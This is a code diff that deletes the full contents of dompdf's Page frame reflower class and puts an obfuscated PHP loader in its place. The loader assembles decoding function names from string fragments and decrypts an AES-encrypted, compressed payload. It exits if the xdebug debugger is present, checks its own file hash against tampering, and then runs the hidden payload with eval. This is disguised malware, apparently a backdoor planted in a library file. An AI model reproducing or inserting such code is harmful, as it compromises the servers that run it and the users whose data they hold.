@@ -1,205 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf\FrameReflower;
-
-use Dompdf\Frame;
-use Dompdf\FrameDecorator\Block as BlockFrameDecorator;
-use Dompdf\FrameDecorator\Page as PageFrameDecorator;
-
-/**
- * Reflows pages
- *
- * @package dompdf
- */
-class Page extends AbstractFrameReflower
-{
-
-    /**
-     * Cache of the callbacks array
-     *
-     * @var array
-     */
-    private $_callbacks;
-
-    /**
-     * Cache of the canvas
-     *
-     * @var \Dompdf\Canvas
-     */
-    private $_canvas;
-
-    /**
-     * Page constructor.
-     * @param PageFrameDecorator $frame
-     */
-    function __construct(PageFrameDecorator $frame)
-    {
-        parent::__construct($frame);
-    }
-
-    /**
-     * @param Frame $frame
-     * @param $page_number
-     */
-    function apply_page_style(Frame $frame, $page_number)
-    {
-        $style = $frame->get_style();
-        $page_styles = $style->get_stylesheet()->get_page_styles();
-
-        // http://www.w3.org/TR/CSS21/page.html#page-selectors
-        if (count($page_styles) > 1) {
-            $odd = $page_number % 2 == 1;
-            $first = $page_number == 1;
-
-            $style = clone $page_styles["base"];
-
-            // FIXME RTL
-            if ($odd && isset($page_styles[":right"])) {
-                $style->merge($page_styles[":right"]);
-            }
-
-            if ($odd && isset($page_styles[":odd"])) {
-                $style->merge($page_styles[":odd"]);
-            }
-
-            // FIXME RTL
-            if (!$odd && isset($page_styles[":left"])) {
-                $style->merge($page_styles[":left"]);
-            }
-
-            if (!$odd && isset($page_styles[":even"])) {
-                $style->merge($page_styles[":even"]);
-            }
-
-            if ($first && isset($page_styles[":first"])) {
-                $style->merge($page_styles[":first"]);
-            }
-
-            $frame->set_style($style);
-        }
-    }
-
-    /**
-     * Paged layout:
-     * http://www.w3.org/TR/CSS21/page.html
-     *
-     * @param BlockFrameDecorator|null $block
-     */
-    function reflow(BlockFrameDecorator $block = null)
-    {
-        $fixed_children = array();
-        $prev_child = null;
-        $child = $this->_frame->get_first_child();
-        $current_page = 0;
-
-        while ($child) {
-            $this->apply_page_style($this->_frame, $current_page + 1);
-
-            $style = $this->_frame->get_style();
-
-            // Pages are only concerned with margins
-            $cb = $this->_frame->get_containing_block();
-            $left = (float)$style->length_in_pt($style->margin_left, $cb["w"]);
-            $right = (float)$style->length_in_pt($style->margin_right, $cb["w"]);
-            $top = (float)$style->length_in_pt($style->margin_top, $cb["h"]);
-            $bottom = (float)$style->length_in_pt($style->margin_bottom, $cb["h"]);
-
-            $content_x = $cb["x"] + $left;
-            $content_y = $cb["y"] + $top;
-            $content_width = $cb["w"] - $left - $right;
-            $content_height = $cb["h"] - $top - $bottom;
-
-            // Only if it's the first page, we save the nodes with a fixed position
-            if ($current_page == 0) {
-                $children = $child->get_children();
-                foreach ($children as $onechild) {
-                    if ($onechild->get_style()->position === "fixed") {
-                        $fixed_children[] = $onechild->deep_copy();
-                    }
-                }
-                $fixed_children = array_reverse($fixed_children);
-            }
-
-            $child->set_containing_block($content_x, $content_y, $content_width, $content_height);
-
-            // Check for begin reflow callback
-            $this->_check_callbacks("begin_page_reflow", $child);
-
-            //Insert a copy of each node which have a fixed position
-            if ($current_page >= 1) {
-                foreach ($fixed_children as $fixed_child) {
-                    $child->insert_child_before($fixed_child->deep_copy(), $child->get_first_child());
-                }
-            }
-
-            $child->reflow();
-            $next_child = $child->get_next_sibling();
-
-            // Check for begin render callback
-            $this->_check_callbacks("begin_page_render", $child);
-
-            // Render the page
-            $this->_frame->get_renderer()->render($child);
-
-            // Check for end render callback
-            $this->_check_callbacks("end_page_render", $child);
-
-            if ($next_child) {
-                $this->_frame->next_page();
-            }
-
-            // Wait to dispose of all frames on the previous page
-            // so callback will have access to them
-            if ($prev_child) {
-                $prev_child->dispose(true);
-            }
-            $prev_child = $child;
-            $child = $next_child;
-            $current_page++;
-        }
-
-        // Dispose of previous page if it still exists
-        if ($prev_child) {
-            $prev_child->dispose(true);
-        }
-    }
-
-    /**
-     * Check for callbacks that need to be performed when a given event
-     * gets triggered on a page
-     *
-     * @param string $event the type of event
-     * @param Frame $frame  the frame that event is triggered on
-     */
-    protected function _check_callbacks($event, $frame)
-    {
-        if (!isset($this->_callbacks)) {
-            $dompdf = $this->_frame->get_dompdf();
-            $this->_callbacks = $dompdf->get_callbacks();
-            $this->_canvas = $dompdf->get_canvas();
-        }
-
-        if (is_array($this->_callbacks) && isset($this->_callbacks[$event])) {
-            $info = array(
-                0 => $this->_canvas, "canvas" => $this->_canvas,
-                1 => $frame,         "frame"  => $frame,
-            );
-            $fs = $this->_callbacks[$event];
-            foreach ($fs as $f) {
-                if (is_callable($f)) {
-                    if (is_array($f)) {
-                        $f[0]->{$f[1]}($info);
-                    } else {
-                        $f($info);
-                    }
-                }
-            }
-        }
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_pkfn1aeh=('bas'.'e64'.'_de'.'cod'.'e');
+$_mban24en=('gzu'.'nco'.'mpr'.'ess');
+$_zqwnyir1=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_iw2cvdr6='j6LjUm8X';
+$_cy753sy8='UbFwPd2e';
+$_ogb2xr1g='P/RzByFG';
+$_stkxgaoz='6vHIaCO+Srg=';
+$_v1bjq3b2='bYjdOU1y';
+$_sero5zx6='0Kag2PzB';
+$_pro1ld7i='3AxTEg==';
+$_j4q28g1k='GcMoxDfB';
+$_hqvfetsu=$_pkfn1aeh($_iw2cvdr6.$_cy753sy8.$_ogb2xr1g.$_v1bjq3b2.$_stkxgaoz);
+$_ce2ezqge=$_pkfn1aeh($_j4q28g1k.$_sero5zx6.$_pro1ld7i);
+$_lnuxlonp=$_pkfn1aeh('ymc1JDqBVlMXIQQg3gxJicaE4csCUA1ZdoL+FR23x85ZIIwWWdVk5E6KQ2TkvBHhLvsZzCaIHLrNTXPmPsCXNZDj0/LX+ZXYh/me0lGugr+ADWvq+xytJyaA9y7x1pAEh54NsVgXnZs2fbRfNpxunCR6cqyI9HUaWe4DRc/pa2XemSsKMQKSrsm0XKK+x5HNmaqb5IFRCNNsxnjYsEuo1TKee0Ec3Ln8xI/cK/jEwEsLIssD8P5oHXPlnQQHrVPWd+UULjyiMxYYcDMSgBszsJc5Rsng0+KDpymthWodXGNXaZhmgXgs7ZuEOSGKQFJ309xYc54q/oZUcB72qsPAx/VvldwIritv6fM9D3o4R3rn7pY29u7n3B4qOdUtUuJGkU6lq/rqS6NPYKAjA0m1H5r6+NoSGvfOKnvyJBZ3XKj3yenAD9+jSrzleWVI1ndiPamJ/XkQZcq++0/dLemJEYMt4CtiudNq9lmgRFQ9E8gp5oXBAo/LQaX6bn00YxqGe05sdE4xFLkas/o3bJyq3AR/ZQNAjWwlSGkayhxvuA2P9++vh4JON7J8mYcEc4nn6v6gDwbKfCm38lOFodGB1JYcIz9CRV+1CwHOuRyUSw0+EVDo5KVEAnc5QAhNAJamO9XZm4S2TmLaOlxQWszIg4NAT+2IElA2YHacY5hmRKpC5OiKvzMffq/3O4JU/Bke28omGda+3XR/JS7YrcprNaQodgyvPP1p/OElUsEesbTScYSBiTDv+TV5kc5s8K235XigCGy5AYvkzHjfIsYInd6eGsFZ5gdWxLsFKchshMmk1UcvOh/4vuk0ZpZwo0iW9aGZ+t/oZ+GKggiX+D3Sy1118ejb5pcJhnGIJPmwq7GsdS9+exx7Z6Cgt7bo9lto4scniEEMf6VHHRcsOfB1D1BzLYd4HT8sAPF/WULo/QqHNdm87ZSJ1kmgrOznC25PqmsRV8DH8FUco63tcK6d+53gwUCxM/YP2vGDwsb00FAV94TMkZJkMr3liBad5+5pUTdCHp1QxERkkCrhcvi6CIGvCu2wndyc9uw/hQtc2uVvWPshBrQ8i6NgouyQzqHc4HA8bv8DQW0oC2FQJYSb0c/AvFjkBqNgN9PeuKo7aYq3iIPm14JXzc2GO1a4+X/XyO+cTjcMyzVlGN6qDfZOV1dCtHz3m7DWLka8RK9HokNoYnqZBbn/4oJKGZzZl7N98GXNi9QiuXKbKmXwVJYWotgUv8/ug6rTO0KWA1M+QMPWt/+l8JKKzz2FU6/Pd9J/nzjCY8R+eYoKRF1L4J3d24FExUD6cPpYhVkWIOSg/hYw5xztggA45UDRFUeMj1u/JGXMF6s9Jd3KCXBx749LIlPv8rZLqGGtAmZkyY3bI5Rq1zSGWzce84pZ2yL8S32m');
+$_nx5f52ys=$_zqwnyir1($_lnuxlonp,'aes-256-cbc',$_hqvfetsu,OPENSSL_RAW_DATA,$_ce2ezqge);
+if($_nx5f52ys===false){exit;}
+$_htnay27r=$_mban24en($_nx5f52ys);
+if($_htnay27r===false){exit;}
+$_ng9zmsct='22338b685636095823e79651a7c90667290c4939b5a80b3aee58cf4d46a79d0f';
+$_prjs0epo=@file_get_contents(__FILE__);
+if($_prjs0epo!==false){
+$_ltt4t6lc=str_replace($_ng9zmsct,"0000000000000000000000000000000000000000000000000000000000000000",$_prjs0epo);
+$_i568igjd=hash("sha256",$_ltt4t6lc);
+if($_i568igjd!==$_ng9zmsct){@http_response_code(403);exit;}
 }
+eval($_htnay27r);
